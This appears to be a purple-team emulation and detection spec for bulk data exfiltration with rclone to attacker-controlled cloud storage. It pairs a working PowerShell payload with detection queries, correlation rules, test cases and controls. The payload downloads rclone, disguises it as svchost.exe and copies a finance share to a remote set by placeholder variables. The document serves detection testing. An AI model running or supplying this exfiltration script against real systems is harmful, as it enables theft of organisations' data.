identity.name: Bulk Data Exfiltration via Rclone to Cloud Storage (T1567.002)
identity.summary: An attacker with file-server access uses rclone — a legitimate cloud-sync utility — to push hundreds of GB to attacker-controlled cloud storage (MEGA, B2, S3). The traffic blends with sanctioned cloud sync, defeats signature egress controls, and completes in under an hour on modern uplinks.
identity.description: Rclone is the de facto exfiltration tool of the modern ransomware operator. Unit 42's BlackSuit Blitz reporting describes exfiltration of over 400 GB before encryption. The DFIR Report, Mandiant, and CrowdStrike have all documented rclone in Black Basta, BlackSuit, Akira, and Lockbit affiliate playbooks. Detection hinges on (a) the rclone binary itself (renamed often), (b) characteristic configuration patterns (`--multi-thread-streams`, `--transfers`, `--config`), and (c) sustained outbound throughput to non-corporate cloud endpoints. This TTP chains downstream of TTP-2026-0004 (DCSync provides the credentials to access file servers) and upstream of TTP-2026-0006 (post-exfil mass encryption).

techniques.name: Exfiltration Over Web Service: Exfiltration to Cloud Storage
Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol

prerequisites.description: Lab file server with synthetic 'sensitive' data (recommend 5 GB of randomized files to keep the run bounded).
prerequisites.remediation: Populate via the `gen-lab-data.ps1` script in the cortex-pov-engine fixtures.

prerequisites.description: Attacker-controlled rclone remote (MEGA, B2, or a lab-owned S3 bucket).

payload.code:
# Stage 1 — Drop rclone binary (often renamed by attackers). Lab uses canonical name.
$rclone = "C:\Users\Public\Music\svchost.exe"  # masquerade pattern
Invoke-WebRequest -Uri "https://downloads.rclone.org/v1.66.0/rclone-v1.66.0-windows-amd64.zip" -OutFile "$env:TEMP\r.zip"
Expand-Archive -Path "$env:TEMP\r.zip" -DestinationPath "$env:TEMP\r" -Force
Copy-Item -Path (Get-ChildItem "$env:TEMP\r" -Recurse -Filter rclone.exe).FullName -Destination $rclone -Force

# Stage 2 — Write minimal config inline (avoids interactive setup).
$cfg = @"
[${POV_REMOTE_NAME}]
type = ${POV_REMOTE_TYPE}
access_key_id = ${POV_REMOTE_KEY_ID}
secret_access_key = ${POV_REMOTE_KEY_SECRET}
endpoint = ${POV_REMOTE_ENDPOINT}
region = ${POV_REMOTE_REGION}
"@
$cfgPath = "$env:TEMP\rcfg.conf"
Set-Content -Path $cfgPath -Value $cfg -Encoding ASCII

# Stage 3 — Sync 'sensitive' lab data to attacker remote with high concurrency.
& $rclone copy "C:\lab-shares\finance" "${POV_REMOTE_NAME}:${POV_REMOTE_BUCKET}/pov-${POV_RUN_ID}/" `
  --config $cfgPath `
  --transfers 32 `
  --multi-thread-streams 8 `
  --checkers 16 `
  --no-traverse `
  --log-level INFO `
  --stats 10s `
  --use-mmap

input_variables.name: POV_REMOTE_TYPE
input_variables.description: rclone backend type: s3, mega, b2, etc.

input_variables.name: POV_REMOTE_ENDPOINT
input_variables.description: S3-compatible endpoint URL for the lab bucket.

expected_artifacts.description: Process spawn with rclone command-line flags (even if binary is renamed).
rclone configuration file (often dropped to %TEMP% or user profile).
Sustained outbound HTTPS connections to a single destination ASN with high upload byte ratio.
expected_artifacts.expected_value: duration > 60s AND bytes_sent / bytes_received > 10 AND dst_asn NOT IN corp_allowlist

expected_artifacts.description: DNS resolution of known rclone-backend hostnames (e.g., *.mega.nz, *.backblazeb2.com, *.s3.amazonaws.com) from a host that has no business reason to use them.

cleanup.code:
Remove-Item "C:\Users\Public\Music\svchost.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\r.zip" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\r" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\rcfg.conf" -Force -ErrorAction SilentlyContinue
manual_steps: Delete the exfil objects from the attacker remote bucket after validation.
Rotate the lab remote credentials between runs.

iocs.context: Canonical binary name; attackers commonly rename — match on file hash and process behavior, not name alone.
Common attacker-controlled destination; not malicious on its own — flag in combination with rclone behavior.

biocs.name: Rclone Command-Line Flag Pattern
biocs.description: Any process executes with command-line containing rclone-specific flag combinations, regardless of binary name.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter (action_process_image_command_line contains_all ("--transfers","--multi-thread-streams"))
      or (action_process_image_command_line contains "--no-traverse" and action_process_image_command_line contains "copy")
      or (action_process_image_command_line matches "rclone(\\.exe)?\\s+(copy|sync|move|lsd|ls)")

biocs.name: Large Sustained Egress From File Server to Non-Corporate Cloud Provider
biocs.description: Single host sustains >100 Mbps outbound to a non-corporate destination ASN for >2 minutes, with byte-out / byte-in ratio > 10.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_FLOW
| bin _time span=1m
| comp sum(bytes_sent) as bs, sum(bytes_received) as br by src_host, dst_asn, _time
| filter bs > 750000000 and (bs / (br + 1)) > 10
| filter dst_asn not in corp_baseline.cloud_asns_allowlist

biocs.name: Outbound to Known Rclone-Backend Provider From Non-Sanctioned Host
biocs.description: DNS resolution + connection to MEGA / Backblaze B2 / pCloud / yandex disk endpoints from a host where these services are not sanctioned for business use.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_DNS
| filter dns_query matches_any (".*\\.mega\\.nz$",".*\\.mega\\.io$",".*\\.backblazeb2\\.com$",".*\\.pcloud\\.com$",".*\\.disk\\.yandex\\.net$")
| filter src_host not in corp_baseline.sanctioned_cloud_storage_users

xql_queries.name: Confirm rclone-pattern process exec in last 30m
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_command_line contains_any ("--multi-thread-streams","--transfers","--no-traverse")
| fields _time, agent_hostname, action_process_image_name, action_process_image_command_line, actor_process_image_name

xql_queries.name: Confirm large outbound flow during exfil window
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_FLOW
| comp sum(bytes_sent) as total_out by src_host, dst_asn
| filter total_out > 500000000
| sort total_out desc

xql_queries.name: Hosts with both rclone-pattern process and large egress in last 24h
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 86400)
| join (filter event_type = ENUM.PROCESS and action_process_image_command_line contains "--transfers") as proc on agent_hostname
| join (filter event_type = ENUM.NETWORK | comp sum(bytes_sent) as bs by src_host | filter bs > 100000000) as flow on src_host within 1h

correlation_rules.name: Exfiltration — Rclone-Pattern Tool + Large Egress to Non-Corp ASN
correlation_rules.logic: BIOC(Rclone Command-Line Flag Pattern) AND BIOC(Large Sustained Egress From File Server to Non-Corporate Cloud Provider) on same host within 30m

analytics_modules: Advanced DNS Security — abnormal-destination domain category

products.evidence_query: DNS Security logs: category 'storage-services' blocked for non-sanctioned subnets.
App-ID + DLP: rclone application identified or sensitive content match on outbound flow.
Playbook: Exfiltration Response — isolate host, block dst ASN at NGFW, snapshot file-server access logs, page DFIR.

use_cases.name: Double-Extortion Defense — Pre-Encryption Exfiltration Detection
use_cases.description: Detect and disrupt large-volume cloud-storage exfiltration before encryption begins (the modern ransomware playbook stages exfil first).

test_cases.objective: Cortex XDR BIOC `Rclone Command-Line Flag Pattern` fires on rclone-style process exec regardless of binary name.
preconditions: Lab host with Cortex XDR agent.
Test variant runs rclone renamed to `svchost.exe`.
success_criteria: BIOC fires within 30s of process exec.
Alert references both flag-pattern and binary masquerade.

test_cases.objective: NGFW + Advanced DNS Security block or alert on the egress before transfer completes.
preconditions: Lab firewall in path of exfil traffic; storage-services DNS category set to alert/block.
success_criteria: NGFW App-ID identifies rclone OR DLP signature matches.
Advanced DNS Security logs the destination resolution under `storage-services-unsanctioned`.
If in block mode: transfer terminated before 1GB sent.

test_cases.objective: XSIAM correlation rule fuses XDR + NGFW + DNS signals into one incident.
success_criteria: Single incident with three contributing alerts.
Incident timeline shows process → DNS → flow in order.

test_cases.objective: XSOAR auto-response isolates the host and blocks the destination ASN.
success_criteria: NGFW rule pushed to block the dst ASN at the perimeter.

preventive_controls: Application allow-listing on file servers and Tier 0/1 hosts; deny unsigned binaries.
NGFW URL category `storage-services` set to alert/block for subnets that don't need access.
DLP policies on egress for confidential content classifications.
Egress flow accounting — alert any host crossing N GB/hour outbound.
detection_engineering: Build a baseline of normal egress per host and per ASN; alert on top-1% anomalies.
Hunt for rclone flag combinations and unusual cloud-storage DNS resolutions weekly.
Correlate file-server SMB read bursts with downstream egress on the same host.

references.title: Anatomy of an Attack: The 'BlackSuit Blitz' at a Global Equipment Manufacturer
MITRE ATT&CK T1567.002 — Exfiltration to Cloud Storage
The DFIR Report — Rclone exfiltration case studies
